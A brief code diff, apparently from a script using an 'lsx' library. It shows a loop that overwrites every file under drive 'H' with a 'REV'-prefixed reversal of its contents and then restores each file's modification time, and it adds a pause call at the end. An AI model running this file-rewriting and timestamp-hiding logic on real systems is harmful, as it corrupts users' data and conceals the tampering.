@@ -6,3 +6,5 @@ for path in lsx.walk('H'):
         mtime = lsx.file_mtime(path)
         lsx.write(path, b'REV' + bytes(reversed(data)))
         lsx.file_utime(path, mtime)
+
+lsx.pause()
